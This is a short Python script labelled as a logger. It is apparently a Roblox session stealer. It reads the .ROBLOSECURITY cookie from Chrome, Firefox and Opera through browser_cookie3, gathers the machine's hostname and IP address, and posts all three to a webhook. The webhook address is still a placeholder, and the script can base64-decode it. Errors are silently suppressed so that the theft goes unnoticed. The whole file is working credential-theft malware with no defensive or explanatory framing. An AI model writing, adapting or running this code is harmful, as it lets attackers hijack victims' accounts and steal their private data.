hook = "blank for now" 



# logger 



import browser_cookie3, requests, threading, base64, socket



hostname=socket.gethostname()

IPAddr=socket.gethostbyname(hostname)




try:
 weok = base64.b64decode(hook)
except:
 weok = hook



def chrome_logger():

    try:

        cookies = browser_cookie3.chrome(domain_name='roblox.com')

        cookies = str(cookies)

        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

        requests.post(weok, json={'username':'LOGGER', 'content':f'```Hostname: {hostname} IP: {IPAddr} Cookie: {cookie}```'})

    except:

        pass





def firefox_logger():

    try:

        cookies = browser_cookie3.firefox(domain_name='roblox.com')

        cookies = str(cookies)

        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

        requests.post(weok, json={'username':'LOGGER', 'content':f'```Hostname: {hostname} IP: {IPAddr} Cookie: {cookie}```'})

    except:

        pass



def opera_logger():

    try:

        cookies = browser_cookie3.opera(domain_name='roblox.com')

        cookies = str(cookies)

        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

        requests.post(weok, json={'username':'LOGGER', 'content':f'```Hostname: {hostname} IP: {IPAddr} Cookie: {cookie}```'})

    except:

        pass



browsers = [chrome_logger, firefox_logger, opera_logger]



for x in browsers:

    threading.Thread(target=x,).start()
